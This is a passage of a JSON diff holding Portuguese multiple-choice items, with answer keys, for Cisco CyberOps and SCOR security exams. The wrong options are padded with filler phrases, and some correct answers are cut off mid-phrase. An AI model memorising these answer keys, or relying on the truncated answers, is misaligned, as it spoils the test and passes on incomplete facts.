+        "options": [
+          "Portas à escuta, utilizadores ligados, processos em execução e aplicações",
+          "A imagem de fundo durante janelas de manutenção de rotina quando não existem outros controlos",
+          "Apenas o idioma do teclado na maioria dos ambientes de produção",
+          "A altura da secretária quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "A perfilagem de servidor regista portas à escuta, contas, processos e apps para que serviços ou utilizadores inesperados fiquem visíveis.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.8"
+      },
+      {
+        "question": "Que tipo de dados é informação de saúde protegida (PHI)?",
+        "options": [
+          "Registos médicos que identificam um paciente",
+          "Uma previsão do tempo pública quando não existem outros controlos",
+          "Uma licença de software open-source",
+          "O comprimento de um cabo de rede"
+        ],
+        "correct": 0,
+        "explanation": "A PHI é informação de saúde que pode identificar uma pessoa e está protegida por referenciais como o HIPAA.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "5.9"
+      },
+      {
+        "question": "O que medem métricas de SOC como tempo até detetar e tempo até conter?",
+        "options": [
+          "Quão depressa a equipa encontra e limita um incidente",
+          "Quão depressa imprimem as impressoras",
+          "Quão brilhantes são as luzes do SOC",
+          "Quantas chávenas de café se usam quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "Métricas de SOC como TTD/TTC/TTR quantificam a velocidade de resposta para a organização melhorar a deteção e a contenção.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.11"
+      },
+      {
+        "question": "Numa consulta DNS suspeita vista num PCAP, que campos são mais úteis de inspecionar?",
+        "options": [
+          "Nome da consulta, tipo de consulta e endereços da resposta",
+          "Apenas o FCS Ethernet no dia a dia das operações na maioria dos ambientes de produção",
+          "Apenas o TTL do IP em redes empresariais típicas",
+          "Apenas o tamanho da janela TCP sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "A análise de DNS centra-se no nome consultado, no tipo (A/AAAA/TXT/MX) e nas respostas devolvidas, que muitas vezes revelam C2 ou tunneling.",
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.8"
+      },
+      {
+        "question": "O que procura sobretudo alcançar um ataque de buffer overflow num endpoint?",
+        "options": [
+          "Sobrescrever memória para alterar o fluxo de controlo do programa",
+          "Melhorar a segurança da memória",
+          "Comprimir o binário durante janelas de manutenção de rotina",
+          "Atualizar a BIOS com segurança na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "Um buffer overflow escreve para além dos limites de um buffer para corromper memória e muitas vezes sequestrar o fluxo de controlo para execução arbitrária de código.",
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.8"
+      },
+      {
+        "question": "O que é a caça a ameaças (threat hunting)?",
+        "options": [
+          "Procurar proativamente ameaças que as deteções automáticas possam ter falhado",
+          "Esperar que os fornecedores enviem indicadores por email em parques de vários fabricantes",
+          "Apagar todos os registos semanalmente quando não existem outros controlos",
+          "Desativar o EDR para reduzir o ruído em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "A caça a ameaças é uma procura proativa, guiada por hipóteses, de atividade adversária que os alertas existentes possam não ter captado.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.3"
+      },
+      {
+        "question": "O que enfatiza o DevSecOps?",
+        "options": [
+          "Integrar a segurança no pipeline CI/CD em vez de a tratar como um portão final",
+          "Remover todos os testes automáticos em parques de vários fabricantes",
+          "Publicar sem quaisquer revisões durante janelas de manutenção de rotina",
+          "Guardar segredos no código-fonte em parques de vários fabricantes quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O DevSecOps incorpora a segurança nos pipelines de desenvolvimento e entrega (análise, política como código) em vez de a acrescentar no fim.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.3"
+      },
+      {
+        "question": "Um analista vê no registo Security do Windows muitas falhas 4625 seguidas de um 4624 da mesma conta a partir de um IP invulgar. O que sugere mais este padrão?",
+        "options": [
+          "Possível força bruta que acabou por ter sucesso",
+          "Uma desfragmentação de disco bem-sucedida",
+          "Uma renovação DHCP normal sem ferramentas adicionais",
+          "Uma atualização de firmware da impressora"
+        ],
+        "correct": 0,
+        "explanation": "Falhas de início de sessão repetidas (4625) e depois um sucesso (4624) de uma origem estranha é um sinal clássico de força bruta ou spraying bem-sucedido.",
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "O que caracteriza um ataque de negação de serviço distribuída (DDoS)?",
+        "options": [
+          "Muitas fontes coordenadas sobrecarregam a capacidade do alvo",
+          "Um único utilizador erra a password uma vez",
+          "Uma análise antivírus agendada sem ferramentas adicionais",
+          "Uma janela de atualização de firmware sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "O DDoS usa muitas fontes (muitas vezes uma botnet) para inundar um alvo além da sua capacidade, tornando o serviço indisponível.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
+      },
+      {
+        "question": "Que tipo de dados acrescenta tipicamente a Application Visibility and Control (AVC)?",
+        "options": [
+          "Identificação de aplicações para além dos números de porta",
+          "Apenas a intensidade do sinal na Camada 1",
+          "Apenas os números de série dos switches",
+          "Apenas a temperatura do escritório na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "A AVC classifica o tráfego por aplicação (não só por porta), permitindo políticas e monitorização com base nas apps realmente usadas.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "firewall-vpn",
+        "domain": "2.2"
+      },
+      {
+        "question": "Um alerta mostra um registo de proxy para um domínio raro, um hit de assinatura IPS no mesmo fluxo e NetFlow com grande volume de saída. O que deve o analista fazer primeiro?",
+        "options": [
+          "Correlacionar as fontes para confirmar um caso real de exfiltração ou C2",
+          "Ignorar os três porque se contradizem em parques de vários fabricantes",
+          "Apagar o NetFlow no dia a dia das operações segundo a prática comum",
+          "Desativar o proxy na maioria dos ambientes de produção quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "Vários sensores independentes a coincidir no mesmo fluxo aumentam a confiança; correlacionar carimbos de tempo, IPs e utilizadores antes da contenção.",
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.1"
+      },
+      {
+        "question": "Que ameaça específica da cloud envolve o roubo de chaves de API que dão acesso amplo a recursos na cloud?",
+        "options": [
+          "Credenciais comprometidas e APIs inseguras",
+          "Corte de cabo no ISP sem ferramentas adicionais",
+          "Encravamento de papel na impressora",
+          "Falha da luz de fundo do monitor"
+        ],
+        "correct": 0,
+        "explanation": "As falhas na cloud resultam muitas vezes de chaves de API divulgadas ou APIs fracas que dão acesso amplo a armazenamento e computação.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.1"
+      },
+      {
+        "question": "O que é um ataque de injeção de prompt contra um sistema de IA/LLM?",
+        "options": [
+          "Criar entrada que sobrescreve as instruções do modelo para o fazer vazar dados ou agir mal",
+          "Injetar SQL numa base de dados via um formulário na maioria dos ambientes de produção",
+          "Inundar um concentrador VPN sem ferramentas adicionais na maioria dos ambientes de produção",
+          "Sobrescrever o firmware da BIOS no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "A injeção de prompt cria entrada do utilizador que sequestra ou sobrescreve o system prompt, causando fuga de dados ou ações indesejadas.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.3"
+      },
+      {
+        "question": "O que arrisca a 'fuga do system prompt' numa implementação de LLM?",
+        "options": [
+          "Expor instruções ocultas que revelam políticas ou segredos ao utilizador",
+          "Perder o driver da GPU segundo a prática comum em redes empresariais típicas",
+          "Quebrar concessões DHCP sem ferramentas adicionais",
+          "Desativar o syslog em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "Se um LLM revelar o seu system prompt oculto, os atacantes conhecem políticas, instruções de ferramentas ou segredos aí embutidos.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.3"
+      },
+      {
+        "question": "Porque se está a tornar a criptografia pós-quântica (PQC) relevante para arquitetos de segurança?",
+        "options": [
+          "Computadores quânticos grandes podem quebrar algoritmos de chave pública muito usados",
+          "A PQC torna o Wi-Fi mais rápido sem ferramentas adicionais segundo a prática comum",
+          "A PQC substitui cabos Ethernet segundo a prática comum em redes empresariais típicas",
+          "A PQC elimina a necessidade de MFA em redes empresariais típicas quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "Os algoritmos PQC são concebidos para resistir a ataques de computadores quânticos de grande escala que poderiam quebrar RSA e ECC.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
+      },
+      {
+        "question": "O que é o MASQUE no transporte cifrado moderno?",
+        "options": [
+          "Um conjunto de mecanismos HTTP/3 para fazer proxy de tráfego sobre QUIC",
+          "Uma variante de spanning-tree da Camada 2 sem ferramentas adicionais",
+          "Um ID de evento do Windows no dia a dia das operações quando não existem outros controlos",
+          "Um atributo RADIUS para VLANs em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O MASQUE (Multiplexed Application Substrate over QUIC Encryption) define proxy HTTP/3 para o tráfego ser retransmitido de forma segura sobre QUIC.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
+      },
+      {
+        "question": "Que tecnologia VPN da Cisco constrói overlays IPsec hub-and-spoke ou spoke-to-spoke com NHRP?",
+        "options": [
+          "DMVPN",
+          "GETVPN",
+          "Apenas portal SSL sem cliente",
+          "L2TP sem IPsec"
+        ],
+        "correct": 0,
+        "explanation": "O DMVPN usa mGRE e NHRP para construir overlays VPN IPsec escaláveis hub-and-spoke (e spoke-to-spoke).",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.6"
+      },
+      {
+        "question": "O que fornece sobretudo o GETVPN numa WAN empresarial?",
+        "options": [
+          "Tráfego cifrado em grupo sobre uma WAN privada sem túneis por par",
+          "Portal cativo de Wi-Fi de convidados em parques de vários fabricantes",
+          "Filtragem de spam de email quando não existem outros controlos",
+          "Cifra de disco nos endpoints quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O GETVPN usa chaves de grupo GDOI para que os sites numa WAN privada cifrem o tráfego sem construir túneis individuais por par.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.6"
+      },
+      {
+        "question": "Qual é o princípio central de uma arquitetura zero trust?",
+        "options": [
+          "Nunca confiar, verificar sempre — autenticar e autorizar cada pedido",
+          "Confiar em todo o tráfego dentro da LAN corporativa",
+          "Desativar os registos para reduzir custos segundo a prática comum",
+          "Abrir todas as portas para facilitar o suporte em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O zero trust assume que não há confiança implícita pela localização na rede; cada pedido de acesso é autenticado, autorizado e avaliado continuamente.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "1.8"
+      },
+      {
+        "question": "O que é o Cisco SAFE nas discussões de arquitetura de segurança?",
+        "options": [
+          "Um guia de desenho para arquiteturas seguras nos vários locais da rede",
+          "Uma norma de cores de cabos no dia a dia das operações",
+          "Um número de opção DHCP sem ferramentas adicionais no dia a dia das operações",
+          "Um valor de community BGP quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O Cisco SAFE fornece orientação de desenho e fluxos de negócio para construir arquiteturas seguras no campus, WAN, centro de dados e cloud.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "1.9"
+      },
+      {
+        "question": "Ao escolher entre capacidades de IPS e de firewall, o que acrescenta sobretudo um IPS?",
+        "options": [
+          "Inspeção profunda para detetar e bloquear padrões de exploits/malware no tráfego permitido",
+          "Apenas filtragem de MAC na Camada 2 quando não existem outros controlos",
+          "Apenas atribuição de endereços DHCP no dia a dia das operações",
+          "Apenas teste de cabos durante janelas de manutenção de rotina em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "As firewalls aplicam política de permitir/negar; o IPS inspeciona o tráfego permitido em busca de padrões de exploits e malware e pode bloqueá-los.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.1"
+      },
+      {
+        "question": "Que controlo da Camada 2 ajuda a impedir servidores DHCP rogue num switch Cisco?",
+        "options": [
+          "DHCP snooping",
+          "Apenas STP PortFast",
+          "LLDP",
+          "CDP segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "O DHCP snooping constrói uma tabela de ligações de confiança e descarta respostas DHCP de portas não confiáveis, bloqueando servidores DHCP rogue.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "O que usa a Dynamic ARP Inspection (DAI) para validar pacotes ARP?",
+        "options": [
+          "A base de dados de ligações do DHCP snooping",
+          "A tabela de encaminhamento BGP",
+          "O stratum do NTP segundo a prática comum",
+          "A community string do SNMP sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "A DAI verifica o ARP face à tabela de ligações do DHCP snooping e descarta pacotes ARP que não correspondam a ligações de confiança.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Porque usam as equipas de segurança os CIS Benchmarks para equipamentos como Secure Firewall (FTD) e IOS XE?",
+        "options": [
+          "Fornecem recomendações consensuais de hardening",
+          "Substituem a necessidade de qualquer autenticação",
+          "Definem apenas planos de canais Wi-Fi",
+          "Regulam o termóstato do escritório"
+        ],
+        "correct": 0,
+        "explanation": "Os CIS Benchmarks oferecem linhas de base de hardening consensuais e independentes do fabricante que reduzem más configurações comuns em equipamentos de rede e segurança.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "2.5"
+      },
+      {
+        "question": "Na resolução de problemas de AAA, como diferem sobretudo TACACS+ e RADIUS na administração de equipamentos?",
+        "options": [
+          "O TACACS+ separa auth/author/acct e cifra o payload completo",
+          "O RADIUS usa sempre TCP 49; o TACACS+ usa UDP 1812",
+          "São idênticos em tudo no dia a dia das operações",
+          "O TACACS+ não pode autorizar comandos na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "O TACACS+ (TCP) cifra o pacote inteiro e separa as funções AAA, sendo preferido para administração de equipamentos; o RADIUS cifra sobretudo o campo da password.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "2.6"
+      },
+      {
+        "question": "Que protocolo deve substituir o SNMPv1/v2c na gestão segura de equipamentos?",
+        "options": [
+          "SNMPv3 com autenticação e privacidade",
+          "Telnet durante janelas de manutenção de rotina",
+          "HTTP sem TLS",
+          "TFTP no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "O SNMPv3 acrescenta autenticação e cifra (authPriv), ao contrário das communities em texto simples do SNMPv1/v2c.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.7"
+      },
+      {
+        "question": "No Cisco Secure Firewall (FTD), o que permitem as regras de Access Control Policy com AVC e filtragem de URL?",
+        "options": [
+          "Permitir/bloquear com base na aplicação e categoria de URL",
+          "Apenas filtragem de endereço MAC",
+          "Apenas NAT estático na maioria dos ambientes de produção",
+          "Apenas filtragem de rotas OSPF durante janelas de manutenção de rotina"
+        ],
+        "correct": 0,
+        "explanation": "O Access Control do FTD pode corresponder a aplicações (AVC) e categorias de URL, permitindo permitir/bloquear com base na intenção para além das 5-tuplas.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.8"
+      },
+      {
+        "question": "Que cliente é comummente usado com o Cisco Secure Firewall para VPN de acesso remoto?",
+        "options": [
+          "Cisco Secure Client (antigo AnyConnect)",
+          "Apenas um cliente TFTP quando não existem outros controlos",
+          "Apenas HyperTerminal quando não existem outros controlos",
+          "Apenas um cliente DHCP"
+        ],
+        "correct": 0,
+        "explanation": "O Cisco Secure Client (AnyConnect) fornece VPN de acesso remoto (e outros módulos) a headends Secure Firewall / ASA.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.9"
+      },
+      {
+        "question": "Quando um túnel VPN IPsec no FTD falha ao estabelecer, que passo é mais útil primeiro?",
+        "options": [
+          "Verificar propostas, identidades, encaminhamento e mensagens de debug/registo para falhas de Fase 1/2",
+          "Substituir imediatamente todos os cabos Ethernet sem ferramentas adicionais na maioria dos ambientes de produção",
+          "Desativar os registos sem ferramentas adicionais em redes empresariais típicas",
+          "Mudar o SSID do escritório durante janelas de manutenção de rotina no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "As falhas de estabelecimento de túnel são normalmente desfasamento de propostas IKE, problemas de identidade/PSK/certificado ou encaminhamento; verificar registos/debugs de Fase 1 vs Fase 2.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.10"
+      },
+      {
+        "question": "No Modelo de Responsabilidade Partilhada da cloud para IaaS, quem endurece tipicamente o SO convidado?",
+        "options": [
+          "O cliente",
+          "Apenas o fornecedor da cloud",
+          "Ninguém",
+          "O ISP"
+        ],
+        "correct": 0,
+        "explanation": "Em IaaS o fornecedor protege o hipervisor e as instalações; o cliente é responsável pelo SO convidado, apps e dados.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.1"
+      },
+      {
+        "question": "Para que serve sobretudo o Cisco Secure Workload (antigo Tetration)?",
+        "options": [
+          "Microsegmentação e visibilidade de workloads com base em fluxos de aplicação observados",
+          "Páginas de boas-vindas de Wi-Fi de convidados durante janelas de manutenção de rotina",
+          "Certificação de cabos no dia a dia das operações quando não existem outros controlos",
+          "Assinaturas de email segundo a prática comum em redes empresariais típicas quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O Secure Workload mapeia dependências de aplicações e aplica políticas de microsegmentação em workloads no centro de dados e na cloud.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.4"
+      },
+      {
+        "question": "Porque pode um desenho ao nível SCOR enviar registos de segurança da cloud para o Splunk?",
+        "options": [
+          "Para centralizar a monitorização e a correlação entre fontes cloud e on-prem",
+          "Para apagar automaticamente os registos da cloud na maioria dos ambientes de produção",
+          "Para substituir o IAM sem ferramentas adicionais",
+          "Para atribuir IPs privados em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "Ingerir registos da cloud no Splunk (ou SIEM semelhante) permite deteção e investigação unificadas em ambientes híbridos.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "Para que se usa comummente o eBPF na segurança moderna de workloads?",
+        "options": [
+          "Observabilidade e política programáveis e seguras ao nível do kernel sem carregar módulos clássicos",
+          "Substituir certificados TLS sem ferramentas adicionais na maioria dos ambientes de produção",
+          "Atribuir VLANs em switches de acesso quando não existem outros controlos sem ferramentas adicionais",
+          "Desenhar diagramas de rede sem ferramentas adicionais no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "O eBPF corre programas em sandbox no kernel para observabilidade e política de segurança de alto desempenho em workloads Linux modernos.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.6"
+      },
+      {
+        "question": "Em que se foca a segurança de Infrastructure as Code (IaC) no DevSecOps?",
+        "options": [
+          "Analisar templates e pipelines em busca de más configurações antes da implementação",
+          "Pintar armários de servidores durante janelas de manutenção de rotina",
+          "Escolher cadeiras de secretária no dia a dia das operações na maioria dos ambientes de produção",
+          "Definir o brilho do monitor na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "A segurança de IaC analisa Terraform/CloudFormation/etc. e pipelines CI em busca de omissões inseguras antes de a infraestrutura ser implementada.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "3.7"
+      },
+      {
+        "question": "Como difere o Security Service Edge (SSE) do conceito mais amplo de SASE?",
+        "options": [
+          "O SSE são os serviços de segurança (SWG, CASB, ZTNA)",
+          "O SSE é só uma firewall; o SASE é só Wi-Fi",
+          "São termos de marketing idênticos sem diferença técnica",
+          "O SSE substitui totalmente a Ethernet segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "O SSE cobre segurança entregue na cloud (SWG, CASB, ZTNA, FWaaS); o SASE combina isso com a rede WAN (tipicamente SD-WAN).",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.1"
+      },
+      {
+        "question": "O que protege sobretudo o Cisco Secure Access Secure Internet Access?",
+        "options": [
+          "O acesso dos utilizadores à Internet pública com controlos de segurança entregues na cloud",
+          "Apenas o tráfego east-west dentro de um único rack no dia a dia das operações sem ferramentas adicionais",
+          "Apenas portas de consola série segundo a prática comum sem ferramentas adicionais",
+          "Apenas cabos submarinos sem ferramentas adicionais em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O Secure Internet Access aplica controlos estilo SWG/CASB aos utilizadores que navegam na Internet pública via Cisco Secure Access.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.2"
+      },
+      {
+        "question": "Sobre o que é sobretudo o Secure Private Access (SPA) no Cisco Secure Access?",
+        "options": [
+          "Acesso zero-trust a aplicações privadas sem expor toda a rede",
+          "Abrir todas as portas na firewall quando não existem outros controlos",
+          "Desativar o MFA quando não existem outros controlos",
+          "Ligar todas as VLANs em bridge no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "O SPA fornece acesso estilo ZTNA a apps privadas específicas, reduzindo a necessidade de colocar os utilizadores em toda a rede corporativa.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.3"
+      },
+      {
+        "question": "Porque configurar DLP e guardrails de IA no Secure Internet Access?",
+        "options": [
+          "Para impedir a saída de dados sensíveis e limitar o uso arriscado de ferramentas de IA",
+          "Para aumentar a velocidade de transferência durante janelas de manutenção de rotina",
+          "Para atribuir endereços IP sem ferramentas adicionais quando não existem outros controlos",
+          "Para reiniciar os pontos de acesso todas as noites sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "O DLP impede a exfiltração de dados sensíveis via web/SaaS; os guardrails de IA limitam prompts ou destinos arriscados em ferramentas de IA generativa.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.4"
+      },
+      {
+        "question": "O que ajudam as pontuações Investigate do Cisco Secure Access um analista a compreender?",
+        "options": [
+          "Quão arriscado parece um destino ou domínio com base em threat intelligence",
+          "A temperatura física de um router no dia a dia das operações",
+          "O comprimento de um cabo de patch em redes empresariais típicas",
+          "O brilho de um LED quando não existem outros controlos durante janelas de manutenção de rotina"
+        ],
+        "correct": 0,
+        "explanation": "As pontuações Investigate resumem o risco de threat intel de domínios/destinos para os analistas priorizarem bloqueios e investigações.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "4.5"
+      },
+      {
+        "question": "Como diferem sobretudo EPP e EDR?",
+        "options": [
+          "O EPP foca-se na prevenção",
+          "O EPP só cifra discos; o EDR só imprime registos",
+          "São o mesmo acrónimo em parques de vários fabricantes",
+          "O EDR substitui a necessidade de qualquer firewall de rede"
+        ],
+        "correct": 0,
+        "explanation": "As plataformas de proteção de endpoints enfatizam a prevenção (AV); o EDR acrescenta telemetria, deteção, investigação e capacidades de resposta.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
+      },
+      {
+        "question": "Para que serve a avaliação de postura do endpoint antes de conceder acesso à rede?",
+        "options": [
+          "Verificar se o dispositivo cumpre os requisitos de segurança (atualizações",
+          "Medir a velocidade de escrita do utilizador em redes empresariais típicas",
+          "Contar separadores abertos do browser em redes empresariais típicas segundo a prática comum",
+          "Escolher um fundo de ambiente de trabalho sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "A avaliação de postura verifica a saúde do dispositivo (atualizações, cifra, estado do AV) e pode pôr em quarentena dispositivos não conformes.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.3"
+      },
+      {
+        "question": "Para que serve sobretudo o Cisco Secure Malware Analytics (Threat Grid)?",
+        "options": [
+          "Detonação em sandbox e análise de malware com threat intelligence",
+          "Atribuir IDs de processo OSPF sem ferramentas adicionais segundo a prática comum",
+          "Desenhar plantas de piso quando não existem outros controlos",
+          "Configurar orçamentos PoE quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O Secure Malware Analytics detona e analisa amostras numa sandbox e enriquece os resultados com threat intelligence.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.4"
+      },
+      {
+        "question": "Ao configurar o Cisco Secure Endpoint, qual é um objetivo principal?",
+        "options": [
+          "Implementar o conector e as políticas para prevenir e detetar malware nos hosts",
+          "Substituir o switch de núcleo durante janelas de manutenção de rotina",
+          "Desativar todas as portas USB para sempre sem política no dia a dia das operações",
+          "Desligar sempre a análise na cloud quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O Secure Endpoint implementa conectores e políticas de prevenção, deteção e resposta contra malware nos endpoints.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.5"
+      },
+      {
+        "question": "Um analista revê um evento de deteção de malware do Cisco Secure Endpoint. O que deve examinar primeiro?",
+        "options": [
+          "Hash do ficheiro, caminho, linhagem do processo e disposição para decidir isolamento ou permitir",
+          "Apenas a cor do portátil quando não existem outros controlos em parques de vários fabricantes",
+          "Apenas o tipo de letra favorito do utilizador durante janelas de manutenção de rotina segundo a prática comum",
+          "Apenas o tempo de concessão DHCP em parques de vários fabricantes no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "Os eventos de deteção incluem hash, caminho, processo-pai e disposição; isso guia se isolar, remediar ou afinar um falso positivo.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.6"
+      },
+      {
+        "question": "Contra o que protege sobretudo o Cisco Security Email Threat Defense?",
+        "options": [
+          "Ameaças de email malicioso e phishing com deteção e remediação",
+          "Loops na Camada 2 durante janelas de manutenção de rotina",
+          "Sobrecarga PoE em parques de vários fabricantes",
+          "Desfasamentos de TTL de DNS quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O Email Threat Defense foca-se em detetar e remediar phishing e malware entregues por email.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.7"
+      },
+      {
+        "question": "No Cisco ISE, em que ajuda sobretudo o profiling?",
+        "options": [
+          "Identificar tipos de dispositivo para a política tratar impressoras",
+          "Aumentar a potência de transmissão Wi-Fi",
+          "Comprimir o NetFlow sem ferramentas adicionais",
+          "Escolher as cores dos racks durante janelas de manutenção de rotina"
+        ],
+        "correct": 0,
+        "explanation": "O profiling do ISE classifica endpoints (impressora, telefone IP, PC) a partir de sondas de rede para que as políticas de autorização conheçam o tipo de dispositivo.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
+      },
+      {
+        "question": "O que verifica tipicamente a verificação de conformidade do dispositivo antes do acesso completo à rede?",
+        "options": [
+          "Se o endpoint cumpre os requisitos de postura de segurança",
+          "Se o utilizador gosta do fundo de ecrã",
+          "Se a secretária é ajustável quando não existem outros controlos",
+          "Se o rato é sem fios em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "As verificações de conformidade/postura confirmam atualizações, cifra de disco, AV e controlos semelhantes antes de conceder acesso completo.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.2"
+      },
+      {
+        "question": "O que fornece o MAB (MAC Authentication Bypass) quando o 802.1X não é possível?",
+        "options": [
+          "Autenticação de recurso usando o endereço MAC do dispositivo",
+          "Autenticação mútua completa por certificado sem ferramentas adicionais",
+          "Apenas DNS cifrado no dia a dia das operações",
+          "Peering BGP automático em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "O MAB autentica endpoints que não fazem 802.1X (impressoras, algum IoT) pelo endereço MAC, normalmente com acesso limitado.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.3"
+      },
+      {
+        "question": "Para que serve o Change of Authorization (CoA) com o ISE?",
+        "options": [
+          "Alterar dinamicamente a autorização de uma sessão (por exemplo quarentena) sem esperar novo login",
+          "Mudar o hostname do equipamento durante a noite durante janelas de manutenção de rotina em redes empresariais típicas",
+          "Rodar as fases das PDUs do rack no dia a dia das operações em redes empresariais típicas",
+          "Atualizar a cor da parede em parques de vários fabricantes quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O CoA permite ao ISE impor um novo estado de autorização a meio da sessão, por exemplo pôr em quarentena um host não conforme.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.4"
+      },
+      {
+        "question": "Que técnica encapsula dados dentro de consultas DNS para contornar firewalls típicas?",
+        "options": [
